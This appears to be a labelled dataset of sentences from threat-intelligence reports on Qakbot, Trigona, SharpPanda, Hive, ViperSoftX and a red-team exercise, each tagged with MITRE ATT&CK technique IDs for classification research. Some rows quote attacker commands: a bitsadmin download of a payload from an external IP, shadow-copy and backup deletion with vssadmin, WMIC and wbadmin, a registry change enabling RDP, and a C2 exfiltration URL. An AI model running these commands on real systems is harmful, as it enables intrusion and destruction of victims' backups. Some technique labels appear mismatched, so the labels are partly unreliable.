"Logon Process: NtLmSsp Authentication Package: NTLM Transited Services: - Package Name (NTLM only): NTLM V2 During that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content.",T1057
The Zip contains an ISO image file.,T1204.002
The victim double clicks the ISO to mount it (1).,T1204.002
"The mounted file contains a hidden folder (4), a 200+MB padded file and a visible shortcut file disguised as a zip.","T1027, T1564.001"
The shortcut file (2) executes a CMD file (3) when clicked.,T1059.003
The CMD file contains commands which use certutil (renamed here as slaughterhouse.exe) to decode Qakbot’s DLL (brainstorms.sql).,"T1059.003, T1140"
"This file is base64 twice, thus requires two rounds of decoding using certutil.","T1027, T1140"
The decoded DLL is then executed using rundll32 and injects Qakbot into wermgr.exe.,"T1055, T1140, T1218.011"
"Victims can be lured into clicking executable content including binaries, scripts or shortcut files masquerading as benign filetypes such as PDFs or folders.",T1204.002
The use of ISO images has seen some iterative improvements throughout the last year by threats such as Qakbot.,T1204.002
"This includes encapsulating the image in one or more filetypes (Zips, PDFs, HTML), padding the contents with benign data or chaining together a series of scripts to decode or unpack the final payload.","T1027, T1140"
"It included a standalone file padded with over 200MB of blank spaces, likely to impede analysis of the decompressed ISO file.",T1027
"Unit 42 researchers have observed Trigona’s threat operator engaging in behavior such as obtaining initial access to a target’s environment, conducting reconnaissance, transferring malware via remote monitoring and management (RMM) software, creating new user accounts and deploying ransomware.",T1219
"The ransomware then appends the ._locked file extension, modifies registry keys to maintain persistence, and drops ransom notes.",T1112
"Creates two registry keys for persistence, one for the ransomware binary and another for the ransom note.",T1547.001
"“path” Encrypts only files contained within specified path /!local Does not encrypt local system files, only encrypts files on local network /!lan Does not encrypt local network files, only encrypts files on local system /autorun_only “path” Creates registry key for persistence only.",T1547.001
"Allows for optional “path” to be provided to override default path, does not encrypt files The ransomware establishes persistence through the creation of two keys in CurrentVersion\Run.",T1547.001
Keys found in CurrentVersion\Run contain references to programs that will execute when a user logs in.,T1547.001
"The HTML code in this file contains embedded JavaScript functionality, which displays ransom note details as shown below in Figure 1.",T1027
"After conducting reconnaissance, Trigona operators used Splashtop – a remote access and management (RMM) tool – to transfer the following malware into the target’s environment.",T1072
Start.bat Start.bat is a batch script that performs the following activities: It creates a new folder at C:\temp It copies other malicious batch and EXE files from a compromised internal Server Message Block (SMB) server to the newly created temp folder It executes Turnoff.bat Turnoff.bat Turnoff.bat is a cleanup script used to remove evidence of the attack on a system.,"T1027, T1570, T1059.003"
"It does so by performing the following activities: Clearing the Recycle Bin of any mounted drive Attempting to use sc stop and taskkill to stop over 100 services related to various areas ranging from remote desktop tools to Windows Defender Attempting to stop services related to VMware, Hyper-V and SQL Ending several running tasks related to the stopped services mentioned above Clear Windows Event Logs (using wevutil cl)",T1562.001
42 researchers have observed that cleanup scripts from other threat actors are usually smaller and more specific to the tools used by that actor.,T1027
Newuser.bat Newuser.bat is a batch script that creates a new user with the name fredla and the password Qw123456.,T1059.003
"DC2.exe DC2.exe contains a password protected version of Mimikatz, which is a tool used for extracting sensitive information such as passwords and authentication credentials from a Windows operating system.","T1027, T1003.001"
This version of Mimikatz has been compressed using UPX.,T1027
"While UPX is often legitimately used to reduce file size, we have observed threat actors utilizing UPX and other packing programs to evade static detection of the underlying payload.",T1027
"Among its many legitimate uses, Unit 42 researchers have most often observed Mimikatz being leveraged maliciously by threat actors in the following ways: Credential Loading Mimikatz loads credentials from various sources such as Windows memory, Local Security Authority Subsystem Service (LSASS) process and the Windows registry.",T1003.001
"Credential Manipulation Mimikatz allows the user to manipulate the dumped credentials, such as changing passwords, creating new user accounts and adding users to groups.",T1003.001
"DC4.exe DC4.exe is a small, UPX-packed password protected binary that generates and executes an embedded batch file.","T1027, T1059.003"
"Upon execution, the batch file makes the following changes to the system: Disables the User Account Control (UAC) and sets cmd.exe as a debugger for HelpPane.exe, utilman.exe, Magnify.exe and sethc.exe.","T1059.003, T1548.002"
Opens specific ports on the firewall to allow remote desktop connections using the netsh command.,"T1021.001, T1112"
Modifies the Windows registry to allow remote desktop connections.,"T1021.001, T1112"
"Wrapping Advanced Port Scanner in Inno Setup adds an additional layer of obfuscation to the code, and it is likely to evade static signature detection, forcing dynamic analysis to determine functionality rather than relying on traditional static code signatures.",T1027
Software Deployment Tools Trigona operators use Splashtop to move laterally and transfer malware between compromised hosts in the victim’s environment.,T1072
"Accessibility Features DC4.exe creates a batch script that, when executed, creates a “Sticky Keys backdoor” that allows for creation of a command prompt with NT AUTHORITY\SYSTEM privileges. T1136.",T1059.003
Obfuscated Files or Information Trigona operators use UPX to pack DC2.exe and DC4.exe to avoid static signature detection.,T1027
"For DC6.exe, Trigona hid the installer for Advanced Port Scanner within Inno Setup installer to evade static signature detection. T1112.",T1027
"Modify Registry DC4.exe creates a batch script that, when executed, modifies the Windows Registry to allow remote desktop connections.","T1059.003, T1112"
Disable or Modify System Firewall Trigona operators open up an Remote Desktop Protocol (RDP) port in the firewall with DC4.exe. T1070.001.,T1021.001
"Indicator Removal: File Deletion Trigona operators delete files such as mim.exe, mim32.exe, zam.exe and zam.bat to cover their tracks.",T1070.004
Credentials from Password Stores Trigona operators use Mimikatz to dump passwords. T1003.001.,T1003.001
OS Credential Duping: LSASS Memory Trigona operators use Mimikatz to dump passwords from LSASS.,T1003.001
Remote Desktop Protocol Trigona operators utilize RDP to move laterally in the victim’s environment.,T1021.001
Lateral Tool Transfer Trigona operators use Splashtop to transfer malicious tools from computer to computer in the victim’s environment.,T1570
"Ingress Tool Transfer Trigona operators utilize Splashtop to transfer netscan.exe, netscan.lic, netscan.xml, newuser.bat, start.bat and turnoff.bat. T1219.",T1072
Remote Access Software Trigona operators install and execute remote access tools such as Splashtop on targeted systems.,T1219
We hope that shining a light on Trigona and its uncommon technique of using password-protected executables to obfuscate malware helps defenders better protect their organizations against this threat.,T1027
"The APT group utilizes spear-phishing techniques to obtain initial access, employing a combination of outdated Microsoft Office document vulnerabilities, novel evasion techniques, and highly potent backdoor malware.",T1072
"In its latest campaign, the SharpPanda APT group employs a forged document linked to G7 to target various governments within the G20 forum.",T1566.001
The infection process initiates through a spam email comprising an attached MS Office document named “[FINAL] Hiroshima Action Statement for Resilient Global Food Security_trackchanged.docx.”,T1566.001
"The emails contain weaponized versions of seemingly genuine official documents, which employ the remote template injection method to retrieve the next stage of the malware from the TA’s Command-and-Control (C&C) server.",T1055
"Figure 3 – Opened document attachment from spam email Upon opening the document, it initiates the download of a new payload from the attacker’s remote server (hxxp[:]//13[.]236[.]189[.]80:8000/res/translate[.]res), which is RTF file serving as the next-level payload.",T1105
This tool enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Word’s Equation Editor.,"T1027, T1072"
"RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017-11882, within the Equation Editor of Microsoft Office.",T1072
The RTF file includes both an encrypted payload and shellcode.,T1027
"Once the RTF file is executed, it proceeds to decrypt and drops an embedded payload, which is a DLL file saved under the name “c6gt.b” in the %temp% directory.","T1027, T1140"
"It achieves this by creating a scheduled task entry, which executes the export function “StartA” from the DLL “c6gt.b” using rundll32.exe on a daily basis.","T1106, T1218.011, T1053.005"
"Figure 5 – Embedded payload in RTF file Once the persistence is established, the RTF file proceeds to execute the downloaded DLL payload by utilizing the “rundll32.exe” command as follows:",T1218.011
"Figure 6 – Export functions of the DLL loader When the loader is executed through rundll32.exe, it collects various data from the victim’s computer.",T1218.011
"This includes the hostname, operating system name, OS version, username, Internet information, as well as the presence of any installed anti-virus software on the machine.","T1016, T1518.001, T1082"
"Subsequently, the loader encrypts the collected information using RC4 encryption with the key “xkYgv127” and encodes it using base64.",T1027
"The encrypted data is then exfiltrated using the below C&C URL: hxxps://13[.]236[.]189[.]80:8001/G0AnyWhere_up[.]jsp?Data=[redacted] The figure below illustrates the exfiltrated data sent to the C&C server, as well as the decrypted/decoded stolen information obtained from the victim’s machine.","T1041, T1573.001"
"If they deem the victim’s machine to be intriguing, the C&C server responds with the next stage executable.",T1573.001
"During the final phase of the infection chain, the malicious loader in the SharpPanda APT campaign is specifically designed to download a backdoor module.",T1105
"In previous SharpPanda APT campaigns, the loader establishes a connection with a C&C server in the final stage of the attack.",T1573.001
"Subsequently, it downloads and executes a malicious backdoor.",T1105
"With its extensive capabilities, this backdoor possesses the ability to perform a variety of operations, including: Capture screenshots of victims’ system Obtain information about processes and services running on the machine Create or terminate processes Delete/Create/Rename/Read/Write files and retrieve file attributes Retrieve TCP/UDP tables Retrieve information about registry keys Obtain titles of all top-level windows Trigger a shutdown of the targeted computer Gather computer-specific information such as computer name, username, gateway address, network adapter details, Windows version, and user type Conclusion The SharpPanda APT group is comprised of exceptionally sophisticated cyber-TAs who execute targeted and extended attacks against specific targets, including governments, organizations, and industries, with the objectives of spying, disruption, or monetary gain.","T1057, T1082, T1113, T1012, T1016"
"In addition to those techniques, the actor employed a number of previously unseen techniques designed to to drop the defenses of the victim, inhibit monitoring, disable networking and allow time for the ransomware to finish encrypting files.",T1562.001
"What approach did the malicious actor take to prepare the victim's environment?Initially using Cobalt Strike, the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service (BITSAdmin).""C:\Windows\system32\bitsadmin.exe"" /transfer",T1105
/priority normal http://79.137.206.47/int.exe C:\Windows\int.exe The malicious actor then began using the remote process execution tool PSExec to execute batch files (rdp.bat) that would cause registry changes to enable Remote Desktop sessions (RDP) using reg.exe.,"T1059.003, T1021.001, T1112"
"This enabled the malicious actor to laterally move throughout the victim’s environment using the graphical user interface.PSEXESVC.exe: C:\Windows\PSEXESVC.exe└──cmd.exe: C:\Windows\system32\cmd.exe /c """"rdp.bat"" ""└── reg.exe: reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v","T1059.003, T1112"
"""fDenyTSConnections"" /t",T1112
REG_DWORD /d 0,T1112
"/f Rapid7 observed the malicious actor add/change policies for the Active Directory domain to perform the following:Copy down batch scriptsExecute batch scripts (file1.bat), which:Creates administrator account on the local systemReconfigures boot configuration data (bcdedit.exe) so that the host will not load any additional drivers or services (ie: network drivers or endpoint protection)Sets various registry values to ensure the created local administrator user will automatically logon by defaultChanges the Windows Shell from Explorer to their malicious script (file2.bat)Reboots the system with the shutdown commandOn reboot, the system logs in and executes the shell (file2.bat), which:Extracts HIVE ransomware payload(s) from an encrypted archive (int.7z) using 7-Zip's console executable (7zr.exe)Executes the ransomware payload (int.exe or int64.exe)Below are some commands observed executed by the malicious actor (with necessary redactions):xcopy.exe /C/Q/H/Y/Z ""\\<REDACTED>\sysvol\<REDACTED>\Policies {<REDACTED>}\Machine\Scripts\Startup\file1.bat"" ""C:\windows"" xcopy.exe /C/Q/H/Y/Z ""\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\file2.bat"" ""C:\windows"" xcopy.exe /C/Q/H/Y/Z ""\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\7zr.exe"" ""C:\windows"" xcopy.exe /C/Q/H/Y/Z ""\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\int.7z"" ""C:\windows\"" C:\WINDOWS\SYSTEM32\cmd.exe /c","T1059.003, T1112"
C:\Windows\int64.exe -u <REDACTED>:<REDACTED> -no-discoveryWhy is this approach so effective?Deployment of ransomware using Active Directory group policies allows the malicious actor to hit all systems in the environment for as long as that group policy is active in the victim’s environment.,T1484.001
"In this case, any system that was booting and connected to the environment would receive the configuration changes, encrypted archive containing the ransomware, a decompression utility to extract the ransomware, configuration changes and the order to reboot and execute.","T1027, T1140"
"This can be especially effective if timed with deployments of patches that require a reboot, done at the beginning of the day or even remotely using Powershell's Stop-Computer cmdlet.",T1027
Storing the ransomware within a 7zip encrypted archive (int.7z) with a password even as simple as (123) makes the task of identifying the ransomware on disk or transmitted across the network nearly impossible.,T1027
With no active defenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor.,T1059.003
"Manually priming the host in this way is more effective than the existing capabilities of the HIVE ransomware which stops specific defensive services (Windows Defender, etc) and kills specific processes prior to encrypting the contents of the drive.",T1562.001
"During analysis it was discovered that passing -u asdf:asdf would result in the Login and Password (colon-delimited) provided to the victim to authenticate to the site behind the onion link on the TOR network:This, and other behaviors were previously reported on by Microsoft's article Hive Ransomware Gets Upgrades in Rust and also by Sophos in their Github Repository of IoC's mentioned in their article Lockbit, Hive, and BlackCat attack automotive supplier in triple ransomware attack.",T1090
"Fundamentally, the sample’s respective flags distill down into encryption operations of local, mount and discovery.",T1106
The local module utilizes the LookupPrivilegeValueW and AdjustTokenPrivileges that Windows API calls on its own process via GetCurrentProcess and OpenProcessToken to obtain SeDebugPrivilege privileges.,T1106
"This is presumably crucial for OpenProcess -> OpenProcessToken -> ImpersonateLoggedOnUser API call attempts to processes: winlogon.exe and trustedinstaller.exe to subsequently stop security services and essential processes, if the --low-key is not passed during execution.",T1106
"ShellExecuteA is also used to launch various Windows binaries (bcdedit.exe, notepad.exe, vssadmin.exe, wbadmin.exe, wmic.exe) for destruction of backups and ransom note display purposes.",T1106
Command line flags may be used to change this behavior and invoke one or more of the modules.,T1059.003
"Will also skip enumeration and stopping of antivirus software.-no-local--no-localDo not encrypt local files-no-mounted--no-mountedDo not encrypted mounted filesystems-no-discovery--no-discoveryDo not enumerate or encrypt file shares on the network-local-only--local-onlyOnly encrypt local file systems-network-only--network-onlyOnly encrypt file shares on the network.-explicit-only--explicit-onlyOnly encrypt files in this specific path specified-min-size--min-sizeOnly encrypt files greater than or equal to a specific number of bytes-t-timer--timerDo not encrypt files until after specified number of secondsBy default, the ransomware will execute the following child processes with the following arguments:Use of vssadmin.exe in order to delete shadow copies of files which deletes unencrypted backups of files they are attempting to ransom:""C:\Windows\System32\vssadmin.exe"" delete shadows /all /quietUse of wmic.exe to create calls that also delete all shadow copies of files which deletes unencrypted backups of files they are attempting to ransom:""C:\Windows\System32\wbem\WMIC.exe"" shadowcopy deleteUse of wbadmin.exe to delete backup catalogs:""C:\Windows\System32\wbadmin.exe"" delete systemstatebackup""C:\Windows\System32\wbadmin.exe"" delete catalog-quiet""C:\Windows\System32\wbadmin.exe"" delete systemstatebackup -keepVersions:3Use of bcdedit.exe to disable automatic repair and ignore errors when booting:""C:\Windows\System32\bcdedit.exe"" /set",T1562.001
Attacker Technique - Auto Logon Count Set OnceAttacker Technique - Potential Process Hollowing To DLLHostAttacker Technique - Shutdown With Message Used By Malicious ActorsAttacker Technique - URL Passed To BitsAdminLateral Movement - Enable RDP via reg.exeSuspicious Process - BCDEdit Enabling SafebootSuspicious Process - Boot Configuration Data Editor ActivitySuspicious Process - DLLHost With No Arguments Spawns ProcessSuspicious Process - Rundll32.exe With No Arguments Spawns ProcessSuspicious Process - ShadowCopy Delete Passed To WMICSuspicious Process - Volume Shadow Service Delete Shadow CopiesIOC's TypeValueRegistry KeyHKLM\System\CurrentControlSet\Control\Terminal ServerRegistry ValueType: DWORD Name: fDenyTSConnections,T1055
"We also noted more sophisticated encryption and basic anti-analysis techniques, such as byte remapping and web browser communication blocking.",T1027
"By: Don Ovid Ladores April 24, 2023Read time: ( words) Save to Folio Subscribe ViperSoftX, a type of information-stealing software, has been primarily reported as focusing on cryptocurrencies, making headlines in 2022 for its execution technique of hiding malicious code inside log files.",T1027
"Since it was first documented in November, we observed this malware campaign differentiating itself from its previous iteration with the use of DLL sideloading for its arrival and execution technique.",T1574.002
"Using WQL command SELECT Manufacturer, Model FROM Win32_ComputerSystem to query ROOT\CIMV2, it checks for the following strings: VMWare Virtual The malware checks if there are monitoring tools, specifically Process Monitor, running in the current machine with the following strings: procmon procmon64 procmon64a Lastly, ViperSoftX checks for a few installed and active antivirus products, namely: Windows Defender ESET",T1518.001
"If all checks pass, the malware proceeds to decrypt the PowerShell code and starts downloading the main ViperSoftX routine.",T1140
"Unlike the typical bitwise operations from typical decryption routines, ViperSoftX uses byte remapping to ensure that the shellcode cannot be easily decrypted without the correct byte map, weaving a cross-stitch template to the palette of 256 (0x100h) bytes.",T1027
"Though this is a very rigid method of hiding its codes, it provides some level of protection against forced decryption.",T1027
Note: The bytes of the encrypted section is a specific index on the byte map found in the sideloaded DLL.,"T1574.002, T1027"
Comparing the mapping of the first four bytes on two samples shows that their offsets within the encrypted region remain the same since they result in a similar shellcode even if they are composed of different bytes per binary.,T1027
"However, considering this is a byte character (with 256 different bytes) and an assembly code instruction at that, brute-forcing it would unlikely yield correctly decrypted results.",T1574.002
"We have also found that each sideloader DLL has its own pair of executable and byte map, and a decryption attempt returns an incorrectly rearranged shellcode if used with another ViperSoftX-related executable.",T1574.002
"Moreover, all the strings, binaries, and other relevant data within the ViperSoftX DLL also gets decrypted the same way.",T1140
"Afterward, the shellcode will then decrypt and load the main ViperSoftX DLL embedded within the carrier.",T1140
The actual bytes of the decrypted shellcode This technique for encryption-decryption is not new but is mostly popular with script malware.,T1140
"As of this writing, the most recent piece of malware that uses this technique is the JavaScript- or Windows Scripting File-packed Magniber ransomware.","T1027, T1059.003"
"Considering the former is a type of script malware, however, this technique for encryption-decryption is easily more discernable during analysis because both the encrypted data and the mapping are in the same file.",T1027
"Furthermore, since the data to be decrypted is in another file, the routine becomes even more difficult to investigate, as analysts would need the correct pair for decryption.",T1140
"Response when accessing the C&C via web browsers (top), and modifying the user-agent to access the C&C and return encoded data (bottom)",T1105
It still downloads a PowerShell code (the main ViperSoftX script) to crawl through different paths in the system for cryptocurrency wallets.,"T1105, T1083"
ViperSoftX scans for these cryptocurrency wallets in local directories: Armory Atomic Wallet Binance Bitcoin Blockstream Green Coinomi Delta Electrum Exodus Guarda Jaxx Liberty Ledger Live Trezor Bridge,T1083
"Top 10 countries affected by ViperSoftX malware in the enterprise (top) and consumer (bottom) sectors Source: Trend Micro Smart Protection Network (SPN) Conclusion and insights While other cybercriminals use sideloading to load another non-binary component (usually the encrypted payload, which comes together as a package with the normal executable and the sideloaded DLL), the chosen techniques of the actors behind ViperSoftX (which involve using WMI Query Language (WQL), DLL sideloading/DLL load order hijacking, PowerShell reflective loading, browser hijacking, and C&C protection) are sophisticated.","T1574.002, T1027"
"From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC).",T1078
They then used forged credentials to move to multiple hosts across different sites in the environment and eventually gained root access to all workstations connected to the organization’s mobile device management (MDM) server.,T1078
The team used this root access to move laterally to SBS-connected workstations.,T1078
"The meeting invite took them to a red team-controlled domain [T1566.002] with a button, which, when clicked, downloaded a “malicious” ISO file [T1204].",T1204.002
"After the download, another button appeared, which, when clicked, executed the file.",T1204.002
"On Workstation 1, the team leveraged a modified SharpHound collector, ldapsearch, and command-line tool, dsquery, to query and scrape AD information, including AD users",T1059.003
"To obtain the credentials, the team took a snapshot of lsass.exe",T1003.001
"[T1003.001] with a tool called nanodump, exported the output, and processed the output offline with Mimikatz.",T1003.001
"They ran the DFSCoerce python script (DFSCoerce.py), which prompted DC authentication to the SharePoint server using the server’s NTLM hash.",T1557.001
"The team then deployed Rubeus to capture the incoming DC TGT [T1550.002], [T1557.001].",T1557.001
"[T1049] on SCCM Server 1, which revealed an active Server Message Block (SMB) connection from SCCM Server 2. Attempted to move laterally to the SCCM Server 2 via AppDomain hijacking, but the HTTPS beacon failed to call back.",T1071.001
"The server administrator relied on a password manager, which stored credentials in a database file.",T1552.001
"In some instances, they used Windows Management Instrumentation (WMI)",T1047
Event Subscriptions,T1047
"In other cases, the team attempted to determine valid accounts based on group name and purpose.",T1078
"The team moved laterally to an MDM server (MDM 1) at Site 3, searched files on the server, and found plaintext credentials [T1552.001] to an application programming interface (API) user account stored in PowerShell scripts.",T1552.001
The team attempted to leverage these credentials to browse to the web login page of the MDM vendor but were unable to do so because the website directed to an organization-controlled single-sign on (SSO) authentication page.,T1078
"The team gained root access to workstations connected to MDM 1—specifically, the team accessed Workstation 4—by: Selecting an MDM user from the plaintext credentials in PowerShell scripts on MDM 1.",T1552.001
"While in the MDM MySQL database, Elevating the selected MDM user’s account privileges to administrator privileges, and Modifying the user’s account by adding Create Policy and Delete Policy permissions [T1098], [T1548]. Creating a policy via the MDM API [T1106], which instructed Workstation 4 to download and execute a payload to give the team interactive access as root to the workstation.",T1105
"On Workstation 6, the team found a .txt file containing plaintext credentials for the user.",T1552.001
"Using the pattern discovered in these credentials, the team was able to crack the user’s workstation account password",T1110
Note: Merlin is a post-exploit tool that leverages HTTP protocols for C2 traffic.,T1071.001
Two commercially available cloud-computing platforms.,T1090
The team used these platforms to create flexible and dynamic redirect servers to send traffic to the team’s Cobalt Strike servers [T1090.002].,T1090
The redirectors used HTTPS reverse proxies to redirect C2 traffic between the target organization’s network and the Cobalt Strike team servers,"T1090, T1071.001"
Content delivery network (CDN) services to further obfuscate some of the team’s C2 traffic.,T1090
This technique leverages CDNs associated with high-reputation domains so that the malicious traffic appears to be directed towards a reputation domain but is actually redirected to the red team-controlled Cobalt Strike servers.,T1090
The team used domain fronting [T1090.004] to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating.,T1090
"This technique, which also leverages CDNs, allows the beacon to appear to connect to third-party domains, such as nytimes.com, when it is actually connecting to the team’s redirect server. Phase II: Red Team Measurable Events Activity",T1090
"[T1048] Network Monitoring and Analysis Tools Intrusion Detection or Prevention Systems Endpoint Protection Platform Detect target hosts and ports Identify associated scanning process Analyze scanning host once detected Develop response plan None Malicious Traffic Generation—Workstation to External Host Establish a session that originates from a target Workstation system directly to an external host over a clear text protocol, such as HTTP.",T1071.001
[T1071] Intrusion Detection or Prevention Systems Endpoint Protection Platform Windows Event Logs Detect and Identify source IP and source process of enumeration Analyze scanning host once detected Develop response plan None Active Directory Account Lockout Lock out several administrative AD accounts Account Access Removal,T1016
[T1531] Windows Event Logs End User Reporting Detect and Identify source IP and source process of exfiltration Analyze host used for exfiltration once detected Develop response plan None Local Admin User Account Creation (workstation) Create a local administrator account on a target workstation system.,T1016
Create Account: Local Account [T1136.001] Account Manipulation [T1098] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Local Admin User Account Creation (server) Create a local administrator account on a target server system.,T1016
"Develop response plan None Workstation Admin Lateral Movement—Workstation to Workstation Use a previously compromised workstation admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on several target Workstations.","T1570, T1569.002, T1078, T1543.003"
"Windows Service [T1543.003] Windows Event Logs Detect account compromise Analyze compromised host Develop response plan None Domain Admin Lateral Movement—Workstation to Domain Controller Use a previously compromised domain admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on a target DC.","T1570, T1569.002, T1078, T1543.003"
"Windows Service [T1543.003] Windows Event Logs Detect account compromise Triage compromised host Develop response plan None Malicious Traffic Generation—Domain Controller to External Host Establish a session that originates from a target Domain Controller system directly to an external host over a clear text protocol, such as HTTP.",T1071.001
"[T1071] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Trigger Host-Based Protection—Domain Controller Upload and execute a well-known (e.g., with a signature) malicious file to a target DC system to generate host-based alerts.","T1105, T1016"
Ingress Tool Transfer [T1105] Endpoint Protection Platform Endpoint Detection and Response Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan Malicious file was removed by antivirus Ransomware Simulation Execute simulated ransomware on multiple Workstation systems to simulate a ransomware attack.,T1016
The team used the organization’s MDM system to gain root access to machines across the organization’s network without being detected.,T1072
The krbtgt account is a domain default account that acts as a service account for the key distribution center (KDC) service used to encrypt and sign all Kerberos tickets for the domain.,T1078
The team discovered several standard user accounts that have local administrator access to critical servers.,T1078
This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain.,T1078
"The team performed an NTLM-relay attack to obtain the DC’s TGT, followed by a golden ticket attack on a SharePoint server with Unconstrained Delegation to gain the ability to impersonate any Site 1 AD account. Use of non-secure default configurations.","T1557.001, T1078"
The organization used default configurations for hosts with Windows Server 2012 R2.,T1078
The default configuration allows unprivileged users to query group membership of local administrator groups.,T1078
The red team used and identified several standard user accounts with administrative access from a Windows Server 2012 R2 SharePoint server.,T1078
"Some workstations allowed unprivileged accounts to have local administrator access; for example, the red team discovered an ordinary user account in the local admin group for the SharePoint server.",T1078
"If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges.",T1078
"During the assessment, the team keylogged a user during a mandatory password change and noticed that only the final character of their password was modified.",T1056.001
User Execution T1204 Users downloaded and executed the team’s initial access payloads after clicking buttons to trigger download and execution.,T1204.002
"Windows Service T1543.003 During Phase II, the team leveraged compromised workstation and domain admin accounts to execute a payload via Windows Service Creation on target workstations and the DC.","T1569.002, T1078, T1543.003"
Event Triggered Execution: Windows Management Instrumentation Event Subscription T1546.003,T1047
The team used WMI Event Subscriptions to move laterally between sites.,T1047
", the team compromised a domain admin account and used it to laterally to multiple workstations and the DC.",T1078
Credential Access Technique Title ID Use OS Credential Dumping: LSASS Memory T1003.001,T1003.001
"The team obtained the cached credentials from a SharePoint server account by taking a snapshot of lsass.exe with a tool called nanodump, exporting the output and processing the output offline with Mimikatz.",T1003.001
Brute Force: Password Cracking T1110.002,T1110
The team cracked a user’s workstation account password after learning the user’s patterns from plaintext credentials.,T1110
Unsecured Credentials: Credentials in Files T1552.001,T1552.001
The team found plaintext credentials to an API user account stored in PowerShell scripts on an MDM server.,T1552.001
Adversary-in-the-middle: LLMNR/NBT-NS Poisoning and SMB Relay T1557.001,T1557.001
"The team ran the DFSCoerce python script, which prompted DC authentication to a server using the server’s NTLM hash.",T1557.001
The team then deployed Rubeus to capture the incoming DC TGT. Steal or Forge Kerberos Tickets: Golden Ticket T1558.001,T1557.001
"During Phase II, they used compromised workstation and domain admin accounts to upload a payload via SMB on several target Workstations and the DC.","T1570, T1078"
Pass the Hash T1550.002,T1557.001
Application Layer Protocol: Web Protocols T1071.001,T1071.001
The team’s C2 redirectors used HTTPS reverse proxies to redirect C2 traffic.,"T1090, T1071.001"
File Transfer Protocols T1071.002,T1071.001
The team used HTTPS reverse proxies to redirect C2 traffic between target network and the team’s Cobalt Strike servers.,"T1090, T1071.001"
"During Phase II, the team uploaded and executed well-known malicious files to the DC to generate host-based alerts.",T1105
Proxy: External Proxy T1090.002 The team used redirectors to redirect C2 traffic between the target organization’s network and the team’s C2 servers.,T1090
Proxy: Domain Fronting T1090.004 The team used domain fronting to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating.,T1090
"From MVISION Insights preview, you can see that NetWalker leverages tactics and techniques common to other ransomware attacks, such as spear phishing attachments for Initial Access, use of PowerShell for deployment, modification of Registry Keys/Startup folder for persistence and encryption of files for impact of course.","T1566.001, T1547.001"
"According to Threat Intelligence and Research, the initial access is performed either through vulnerability exploitation or spear phishing attachments.",T1566.001
"CSC 7 – Email and Web Browser Protection CSC 8 – Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Web Gateway (MWG), Advanced Threat Defense, Web Gateway Cloud Service (WGCS) Initial Access Valid Accounts (T1078) RDP Compromised CSC 5 Secure Configuration of hardware and software CSC 9 Limitation of Network Ports and Protocols CSC 12 Boundary Defense Endpoint Security Platform 10.7, Threat Prevention",T1566.001
"As attackers can quickly change spear phishing attachments, it is important to have adaptable defenses that include user awareness training and response procedures, behavior-based malware defenses on email systems, web access and endpoint systems, and finally sec ops playbooks for early detection and response against suspicious email attachments or other phishing techniques.",T1566.001
"For more information on how McAfee can protect against suspicious email attachments, review this additional blog post. Using valid accounts and protocols, such as for Remote Desktop Protocol, is an attack technique we have seen rise during the initial COVID-19 period.","T1021.001, T1078"
"Proactively Detecting NetWalker Techniques Many of the exploit stage techniques in this attack use legitimate Windows tools or valid accounts to either exploit, avoid detection or move laterally.",T1078
"As security analysts, we want to focus on suspicious techniques, such as PowerShell, used to download files… or execute scripts… or evade defenses… Monitoring or Reporting on NetWalker Events Events from McAfee Endpoint Protection and Web Gateway play a key role in NetWalker incident and threat response.",T1105
"One may assume that traffic over 2222 would be SSH traffic, however further analysis of the traffic generated by the Qakbot Sample in the lab shows that this connection was likely HTTPS in nature.",T1071.001
"The second stage payload, which was later determined to likely be the penetration testing framework ""Brute Ratel,"" was then downloaded via a connection to an IP from Russia.",T1105
These domains had shared trust and were connected via VPN tunnels which allowed the threat actor to move freely between domains.,T1078
"However, after reaching the local DC, the attacker was able to gain a better lay of the land and observe the presence of the other two domains.",T1078
This technique was observed in the Commerce environment through a sharp incline of Kerberos requests using RC4 encryption.,T1573.001
"Although no sample was able to be provided for the Client.exe (which is believed to be the ESXi variant), Quadrant was able to obtain a copy of ""Client_s.exe"" for Windows hosts.",T1059.003
"Two "".bat"" files were sent throughout the organization.",T1059.003
Both were designed to turn off antivirus and anti-malware software.,T1562.001
Suricata logs show that “RClone” was downloaded on the file servers in order to facilitate exfiltration of the logs.,T1105
This legitimate program was abused by the attacker to steal client data.,T1005
"While examining this data, the I.R. team member became aware of the use of RDP by the Threat Actor by observing RDPClip.exe logging that looked, by definition, incredibly suspicious.",T1021.001
The phishing attachment was submitted to the target in a response to an ongoing conversation that was being held between a member of Quadrant’s client and the TPV.,T1566.001
"The attacker submitted the email from ""support[@]capitalizedadventures[.]com"" while posing as ""Jay Peterman"".",T1566.001
"From the two phishing emails, both attachments contain similar malware.",T1566.001
Only changes to the filenames and corresponding commands were observed between the two.,T1027
"When downloaded, the initial attachment is a local HTML file.",T1027
"In both cases the JavaScript files set several variables before running the "".cmd"" file contained within the ISO.",T1059.003
